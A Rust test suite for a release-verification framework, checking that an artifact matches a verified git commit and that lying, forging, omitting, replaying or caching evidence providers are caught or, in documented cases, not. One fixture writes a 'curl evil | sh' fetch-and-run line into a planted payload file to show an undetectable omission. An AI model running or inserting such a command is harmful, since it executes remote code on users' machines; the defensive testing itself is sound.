//! Verifiable observers: providers emit raw observations, trusted
//! verifiers derive the facts, and only verifier output is verified.
//!
//! "Artifact matches verified commit" = `commit(repo, X)` ∧
//! `content_equal(repo, X, dist)`. The git provider is registered as
//! **untrusted** (claims only): its raw objects are checked by hash. The
//! filesystem provider is the trusted observer of mutable state.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Mutex, Once};

use uuid::Uuid;
use v9r_core::fs_provider::FilesystemEvidenceProvider;
use v9r_core::git::GitRepo;
use v9r_core::git_provider::GitEvidenceProvider;
use v9r_core::graph::{
    self, Answer, Attested, Attestor, EvidenceProvider, Key, Registry, Term, Trust,
};
use v9r_core::kernel::{Evidence, Invariant, Obligation, Phase, Requirement, Strength, Verdict};
use v9r_core::runtime::Authorize;
use v9r_core::verifiers::{ContentEquality, FsContent, GitObjects, MANIFEST, NAMES};

// ------------------------------------------------------------ invariant

#[derive(Clone, Debug, PartialEq, Eq)]
struct Release {
    commit: String,
}

const REPO: &str = "repo";
const DIST: &str = "dist";
const INV: &str = "artifact_matches_verified_commit";

struct ArtifactMatchesVerifiedCommit;

impl Invariant<Release, Key, Term> for ArtifactMatchesVerifiedCommit {
    fn id(&self) -> &str {
        INV
    }
    fn obligations(&self, r: &Release) -> Vec<Obligation<Key, Term>> {
        let hard = |key: Key| Obligation {
            invariant: INV.into(),
            phase: Phase::Pre,
            requirement: Requirement::Fact {
                subject: key,
                value: Term::Bool(true),
                strength: Strength::Hard,
            },
        };
        vec![
            hard(Key::new("commit", [REPO, &r.commit])),
            hard(Key::new("content_equal", [REPO, &r.commit, DIST])),
        ]
    }
}

// ------------------------------------------------------------ environment

static HERMETIC: Once = Once::new();

fn git(dir: &Path, args: &[&str]) -> String {
    HERMETIC.call_once(|| {
        for (key, value) in [
            ("GIT_CONFIG_NOSYSTEM", "1"),
            ("GIT_CONFIG_GLOBAL", "/dev/null"),
            ("GIT_AUTHOR_NAME", "agent"),
            ("GIT_AUTHOR_EMAIL", "agent@example.invalid"),
            ("GIT_COMMITTER_NAME", "agent"),
            ("GIT_COMMITTER_EMAIL", "agent@example.invalid"),
            ("GIT_AUTHOR_DATE", "2026-01-01T00:00:00Z"),
            ("GIT_COMMITTER_DATE", "2026-01-01T00:00:00Z"),
        ] {
            std::env::set_var(key, value);
        }
    });
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8(out.stdout).unwrap().trim().to_string()
}

struct Env {
    base: PathBuf,
    work: PathBuf,
    commit: String,
}

impl Env {
    /// `repo` (object format `format`) with commit X containing README,
    /// src/lib.txt and a symlink; `dist/` with exactly X's content.
    fn new(name: &str, format: &str) -> Self {
        let base = std::env::temp_dir().join(format!("v9r-verif-{name}-{}", Uuid::new_v4()));
        let work = base.join("work");
        let repo = work.join(REPO);
        fs::create_dir_all(&work).unwrap();
        git(
            &work,
            &[
                "init",
                "-q",
                "-b",
                "main",
                &format!("--object-format={format}"),
                REPO,
            ],
        );
        for root in [repo.clone(), work.join(DIST)] {
            fs::create_dir_all(root.join("src")).unwrap();
            fs::write(root.join("README"), "readme\n").unwrap();
            fs::write(root.join("src/lib.txt"), "library\n").unwrap();
            std::os::unix::fs::symlink("src/lib.txt", root.join("link")).unwrap();
        }
        git(&repo, &["add", "."]);
        git(&repo, &["commit", "-q", "-m", "release"]);
        let commit = git(&repo, &["rev-parse", "HEAD"]);
        Self { base, work, commit }
    }

    fn git_provider(&self) -> GitEvidenceProvider {
        GitEvidenceProvider::new(
            "git",
            &self.work,
            vec![GitRepo {
                path: REPO.into(),
                bare: false,
            }],
        )
    }

    fn fs_provider(&self) -> FilesystemEvidenceProvider {
        FilesystemEvidenceProvider::new("fs", &self.work)
    }

    fn release(&self) -> Release {
        Release {
            commit: self.commit.clone(),
        }
    }

    fn tamper(&self) {
        fs::write(self.work.join("dist/src/lib.txt"), "backdoor\n").unwrap();
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.base);
    }
}

fn verifiers(registry: &Registry) {
    registry.add_verifier(GitObjects);
    registry.add_verifier(FsContent);
    registry.add_verifier(ContentEquality::new(MANIFEST));
}

/// Untrusted git, trusted fs, the three verifiers.
fn standard(env: &Env) -> Registry {
    let registry = Registry::new();
    registry.register(env.git_provider(), Trust::ClaimsOnly);
    registry.register(env.fs_provider(), Trust::Attesting);
    verifiers(&registry);
    registry
}

async fn verdict(registry: &Registry, release: Release) -> (Verdict, String) {
    let result = graph::runtime(
        registry.clone(),
        vec![Box::new(ArtifactMatchesVerifiedCommit)],
    )
    .authorize(release)
    .await
    .unwrap();
    (result.verdict(), result.decision().to_string())
}

/// The verified value of `key` and who verified it, if any.
fn verified(registry: &Registry, key: &Key) -> Option<(Term, String, String)> {
    registry
        .collect(&[key])
        .get(key)
        .iter()
        .find_map(|e| match e {
            Evidence::Verified { value, provenance } => Some((
                value.clone(),
                provenance.observer.clone(),
                provenance.basis.clone(),
            )),
            _ => None,
        })
}

fn discarded(registry: &Registry, needle: &str) -> bool {
    registry
        .discarded()
        .iter()
        .any(|d| d.reason.contains(needle))
}

// ------------------------------------------------------------ the model

#[tokio::test]
async fn verified_commit_and_artifact_with_an_untrusted_git_provider() {
    for format in ["sha1", "sha256"] {
        let env = Env::new("honest", format);
        let registry = standard(&env);
        let (verdict, decision) = verdict(&registry, env.release()).await;
        assert_eq!(verdict, Verdict::Allow, "{format}: {decision}");
        assert!(
            decision.contains("verified by verifier:git-objects"),
            "{decision}"
        );
        assert!(
            decision.contains("verified by verifier:content-equality"),
            "{decision}"
        );

        // The commit's content needed no observer at all.
        let tree = Key::new("tree_digest", [REPO, env.commit.as_str(), MANIFEST]);
        let (tree_digest, by, basis) = verified(&registry, &tree).unwrap();
        assert_eq!(by, "verifier:git-objects");
        assert!(basis.ends_with("trusts no observer"), "{basis}");
        // The artifact's content needed the filesystem observer.
        let dir = Key::new("dir_digest", [DIST, MANIFEST]);
        let (dir_digest, _, basis) = verified(&registry, &dir).unwrap();
        assert!(basis.ends_with("trusts provider:fs"), "{basis}");
        assert_eq!(tree_digest, dir_digest);

        // The verifiers reproduce what the trusted observers used to claim.
        let old = Registry::new();
        old.register(env.git_provider(), Trust::Attesting);
        old.register(env.fs_provider(), Trust::Attesting);
        assert_eq!(
            old.query(&Key::new("tree_content", [REPO, env.commit.as_str()])),
            Some(tree_digest)
        );
        assert_eq!(
            old.query(&Key::new("dir_content", [DIST])),
            Some(dir_digest)
        );
    }
}

#[tokio::test]
async fn tampered_artifact_is_denied() {
    let env = Env::new("tampered", "sha1");
    env.tamper();
    let (verdict, decision) = verdict(&standard(&env), env.release()).await;
    assert_eq!(verdict, Verdict::Deny, "{decision}");
}

// ------------------------------------------------------------ 1. lies about derived digests

/// Answers the derived kinds directly, with whatever makes them match.
struct DigestLiar {
    id: &'static str,
    claim: String,
}

impl EvidenceProvider for DigestLiar {
    fn id(&self) -> &str {
        self.id
    }
    fn answers(&self, key: &Key) -> bool {
        key.kind == "dir_digest" || key.kind == "content_equal"
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        keys.iter()
            .map(|key| {
                let value = if key.kind == "content_equal" {
                    Term::Bool(true)
                } else {
                    Term::Digest(self.claim.clone())
                };
                Answer::Verified(attestor.attest((*key).clone(), value, "trust me"))
            })
            .collect()
    }
}

#[tokio::test]
async fn provider_lying_about_a_derived_digest_is_overruled() {
    let env = Env::new("lie-derived", "sha1");
    let honest_digest = verified(
        &standard(&env),
        &Key::new("tree_digest", [REPO, env.commit.as_str(), MANIFEST]),
    )
    .unwrap()
    .0;
    env.tamper();
    let registry = standard(&env);
    let Term::Digest(claim) = honest_digest else {
        panic!()
    };
    // Even registered as a trusted observer.
    registry.register(DigestLiar { id: "liar", claim }, Trust::Attesting);
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Deny, "{decision}");
    assert!(discarded(&registry, "derivation mismatch"));
}

/// Supplies object bytes that do not hash to the requested id.
struct ForgingGit(GitEvidenceProvider);

impl EvidenceProvider for ForgingGit {
    fn id(&self) -> &str {
        "git"
    }
    fn answers(&self, key: &Key) -> bool {
        self.0.answers(key)
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        keys.iter()
            .map(|key| {
                Answer::Verified(attestor.attest(
                    (*key).clone(),
                    Term::Bytes(b"blob 9\0backdoor\n".to_vec()),
                    "cat-file --batch",
                ))
            })
            .collect()
    }
}

#[tokio::test]
async fn forged_objects_never_verify_even_from_a_trusted_provider() {
    let env = Env::new("forge", "sha1");
    let registry = Registry::new();
    registry.register(ForgingGit(env.git_provider()), Trust::Attesting);
    registry.register(env.fs_provider(), Trust::Attesting);
    verifiers(&registry);
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(discarded(&registry, "no supplied bytes hash to"));
}

// ------------------------------------------------------------ 2. omitted inputs

/// The filesystem observer, minus some of what it should report.
struct OmittingFs {
    inner: FilesystemEvidenceProvider,
    /// Content not supplied for this listed file.
    content: Option<&'static str>,
    /// Entry left out of listings altogether.
    listing: Option<&'static str>,
}

impl EvidenceProvider for OmittingFs {
    fn id(&self) -> &str {
        "fs"
    }
    fn answers(&self, key: &Key) -> bool {
        self.inner.answers(key) && Some(key.args[0].as_str()) != self.content
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        self.inner
            .provide(keys, attestor)
            .into_iter()
            .map(|answer| match answer {
                Answer::Verified(a) if a.fact().subject.kind == "fs_listing" => {
                    let Term::Map(mut listing) = a.fact().value.clone() else {
                        unreachable!()
                    };
                    if let Some(hidden) = self.listing {
                        listing.remove(hidden);
                    }
                    Answer::Verified(attestor.attest(
                        a.fact().subject.clone(),
                        Term::Map(listing),
                        "directory walk",
                    ))
                }
                other => other,
            })
            .collect()
    }
}

fn with_fs(env: &Env, fs: impl EvidenceProvider + 'static) -> Registry {
    let registry = Registry::new();
    registry.register(env.git_provider(), Trust::ClaimsOnly);
    registry.register(fs, Trust::Attesting);
    verifiers(&registry);
    registry
}

#[tokio::test]
async fn omitted_input_file_leaves_evidence_incomplete() {
    let env = Env::new("omit", "sha1");
    let registry = with_fs(
        &env,
        OmittingFs {
            inner: env.fs_provider(),
            content: Some("dist/src/lib.txt"),
            listing: None,
        },
    );
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(discarded(
        &registry,
        "listed but no observation of fs_file(dist/src/lib.txt)"
    ));
}

#[tokio::test]
async fn omission_from_the_listing_itself_is_undetectable() {
    // A payload added to the artifact, hidden by an observer that leaves it
    // out of the listing: completeness of mutable state is observer trust.
    let env = Env::new("hide", "sha1");
    fs::write(env.work.join("dist/payload.sh"), "curl evil | sh\n").unwrap();
    assert_eq!(
        verdict(&standard(&env), env.release()).await.0,
        Verdict::Deny
    );
    let registry = with_fs(
        &env,
        OmittingFs {
            inner: env.fs_provider(),
            content: None,
            listing: Some("dist/payload.sh"),
        },
    );
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Allow, "false ALLOW: {decision}");
}

/// Supplies every object except blobs: what a git tree names cannot be
/// left out silently.
struct WithholdingGit(GitEvidenceProvider);

impl EvidenceProvider for WithholdingGit {
    fn id(&self) -> &str {
        "git"
    }
    fn answers(&self, key: &Key) -> bool {
        self.0.answers(key)
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        self.0
            .provide(keys, attestor)
            .into_iter()
            .filter(|a| !matches!(a, Answer::Verified(a) if matches!(&a.fact().value, Term::Bytes(b) if b.starts_with(b"blob "))))
            .collect()
    }
}

#[tokio::test]
async fn withheld_git_object_leaves_evidence_incomplete() {
    let env = Env::new("withhold", "sha1");
    let registry = Registry::new();
    registry.register(WithholdingGit(env.git_provider()), Trust::ClaimsOnly);
    registry.register(env.fs_provider(), Trust::Attesting);
    verifiers(&registry);
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
    assert!(discarded(&registry, "not supplied"));
}

// ------------------------------------------------------------ 3. two definitions

#[tokio::test]
async fn two_definitions_that_disagree_block() {
    let env = Env::new("defs", "sha1");
    let both = |env: &Env| {
        let registry = standard(env);
        registry.add_verifier(ContentEquality::new(NAMES));
        registry
    };
    // Honest: both definitions agree.
    assert_eq!(verdict(&both(&env), env.release()).await.0, Verdict::Allow);
    // Same names, different bytes: the manifest says unequal, the names
    // say equal. Contradictory verified facts: BLOCKED.
    env.tamper();
    let (verdict_both, decision) = verdict(&both(&env), env.release()).await;
    assert_eq!(verdict_both, Verdict::Blocked, "{decision}");
    assert!(decision.contains("contradictory"));
    // The weak definition alone: a false ALLOW. Definitions are trusted.
    let weak = Registry::new();
    weak.register(env.git_provider(), Trust::ClaimsOnly);
    weak.register(env.fs_provider(), Trust::Attesting);
    weak.add_verifier(GitObjects);
    weak.add_verifier(FsContent);
    weak.add_verifier(ContentEquality::new(NAMES));
    assert_eq!(verdict(&weak, env.release()).await.0, Verdict::Allow);
}

// ------------------------------------------------------------ 4. stale raw observations

/// Replays its first request's raw attestations (bound to that request).
struct ReplayingFs {
    inner: FilesystemEvidenceProvider,
    kept: Mutex<Vec<Attested>>,
    requests: Mutex<usize>,
}

impl EvidenceProvider for ReplayingFs {
    fn id(&self) -> &str {
        "fs"
    }
    fn answers(&self, key: &Key) -> bool {
        self.inner.answers(key)
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        let mut requests = self.requests.lock().unwrap();
        *requests += 1;
        let fresh = self.inner.provide(keys, attestor);
        let mut kept = self.kept.lock().unwrap();
        if kept.is_empty() {
            // Keep a copy of the first listing.
            for a in &fresh {
                if let Answer::Verified(a) = a {
                    if a.fact().subject.kind == "fs_listing" {
                        kept.push(attestor.attest(
                            a.fact().subject.clone(),
                            a.fact().value.clone(),
                            "directory walk",
                        ));
                    }
                }
            }
            return fresh;
        }
        if keys.iter().any(|k| k.kind == "fs_listing") {
            if let Some(old) = kept.pop() {
                return vec![Answer::Verified(old)];
            }
        }
        fresh
    }
}

/// Re-attests, freshly, the raw content it saw first.
struct CachingFs {
    inner: FilesystemEvidenceProvider,
    cache: Mutex<std::collections::BTreeMap<Key, Term>>,
}

impl EvidenceProvider for CachingFs {
    fn id(&self) -> &str {
        "fs"
    }
    fn answers(&self, key: &Key) -> bool {
        self.inner.answers(key)
    }
    fn provide(&self, keys: &[&Key], attestor: &Attestor) -> Vec<Answer> {
        let mut cache = self.cache.lock().unwrap();
        let mut out = Vec::new();
        for key in keys {
            if let Some(old) = cache.get(*key) {
                out.push(Answer::Verified(attestor.attest(
                    (*key).clone(),
                    old.clone(),
                    "read",
                )));
                continue;
            }
            for answer in self.inner.provide(&[key], attestor) {
                if let Answer::Verified(a) = &answer {
                    cache.insert(a.fact().subject.clone(), a.fact().value.clone());
                }
                out.push(answer);
            }
        }
        out
    }
}

async fn authorize_then_tamper_then_execute(env: &Env, registry: &Registry) -> (bool, Verdict) {
    let mut rt = graph::runtime(
        registry.clone(),
        vec![Box::new(ArtifactMatchesVerifiedCommit)],
    );
    let Authorize::Allowed(auth) = rt.authorize(env.release()).await.unwrap() else {
        panic!("honest at authorization")
    };
    env.tamper();
    let report = rt.execute(*auth).await.unwrap();
    (report.executed, report.decision.verdict)
}

#[tokio::test]
async fn replayed_raw_observation_fails_temporal_binding() {
    let env = Env::new("replay", "sha1");
    let registry = with_fs(
        &env,
        ReplayingFs {
            inner: env.fs_provider(),
            kept: Mutex::default(),
            requests: Mutex::new(0),
        },
    );
    let (executed, verdict) = authorize_then_tamper_then_execute(&env, &registry).await;
    assert!(!executed);
    assert_eq!(verdict, Verdict::Blocked);
    assert!(discarded(
        &registry,
        "attestation from another provider or request"
    ));
}

#[tokio::test]
async fn stale_raw_content_attested_freshly_is_believed() {
    let env = Env::new("cache", "sha1");
    let honest = standard(&env);
    let cached = with_fs(
        &env,
        CachingFs {
            inner: env.fs_provider(),
            cache: Mutex::default(),
        },
    );
    // Same scenario, honest observer: the tampering is seen.
    let env2 = Env::new("cache-honest", "sha1");
    let honest2 = standard(&env2);
    assert_eq!(
        authorize_then_tamper_then_execute(&env2, &honest2).await,
        (false, Verdict::Deny)
    );
    drop(honest);
    // Caching observer: a false ALLOW. Verification checks derivations,
    // not the freshness of what was observed.
    assert_eq!(
        authorize_then_tamper_then_execute(&env, &cached).await,
        (true, Verdict::Allow)
    );
}

// ------------------------------------------------------------ 5. valid raw, wrong derivation

#[tokio::test]
async fn valid_raw_data_with_a_wrong_derivation_is_caught() {
    let env = Env::new("wrong-derivation", "sha1");
    let registry = standard(&env);
    // The same observer also claims a derived digest, computed wrongly.
    registry.register(
        DigestLiar {
            id: "fs-derivations",
            claim: "sha256:0000".into(),
        },
        Trust::Attesting,
    );
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Allow, "{decision}");
    assert!(registry.discarded().iter().any(
        |d| d.provider == "provider:fs-derivations" && d.reason.contains("derivation mismatch")
    ));
}

// ------------------------------------------------------------ third parties

/// A third-party object mirror, outside v9r-core: plain `git cat-file`.
struct Mirror {
    repo: PathBuf,
    forge: bool,
}

impl EvidenceProvider for Mirror {
    fn id(&self) -> &str {
        "mirror"
    }
    fn answers(&self, key: &Key) -> bool {
        key.kind == "git_object" && key.args.len() == 2
    }
    fn provide(&self, keys: &[&Key], _: &Attestor) -> Vec<Answer> {
        keys.iter()
            .filter_map(|key| {
                let oid = &key.args[1];
                let kind = Command::new("git")
                    .args(["cat-file", "-t", oid])
                    .current_dir(&self.repo)
                    .output()
                    .ok()?;
                let body = Command::new("git")
                    .args(["cat-file", "-p", oid])
                    .current_dir(&self.repo)
                    .output()
                    .ok()?;
                let kind = String::from_utf8(kind.stdout).ok()?.trim().to_string();
                // `-p` pretty-prints trees: only blobs and commits are raw.
                let raw = if kind == "tree" {
                    Command::new("git")
                        .args(["cat-file", "tree", oid])
                        .current_dir(&self.repo)
                        .output()
                        .ok()?
                        .stdout
                } else {
                    body.stdout
                };
                let raw = if self.forge && kind == "blob" {
                    b"backdoor\n".to_vec()
                } else {
                    raw
                };
                let mut stored = format!("{kind} {}\0", raw.len()).into_bytes();
                stored.extend(raw);
                Some(Answer::Proposed {
                    key: (*key).clone(),
                    value: Term::Bytes(stored),
                    note: "mirror".into(),
                })
            })
            .collect()
    }
}

#[tokio::test]
async fn third_party_object_mirror_is_safe_and_third_party_fs_is_not() {
    let env = Env::new("third", "sha1");
    for (forge, expected) in [(false, Verdict::Allow), (true, Verdict::Blocked)] {
        let registry = Registry::new();
        registry.register(
            Mirror {
                repo: env.work.join(REPO),
                forge,
            },
            Trust::ClaimsOnly,
        );
        registry.register(env.fs_provider(), Trust::Attesting);
        verifiers(&registry);
        let (verdict, decision) = verdict(&registry, env.release()).await;
        assert_eq!(verdict, expected, "forge={forge}: {decision}");
    }
    // An untrusted filesystem observer: its raw data cannot be checked, so
    // the artifact digest stays a claim.
    let registry = Registry::new();
    registry.register(env.git_provider(), Trust::ClaimsOnly);
    registry.register(env.fs_provider(), Trust::ClaimsOnly);
    verifiers(&registry);
    let (verdict, decision) = verdict(&registry, env.release()).await;
    assert_eq!(verdict, Verdict::Blocked, "{decision}");
}
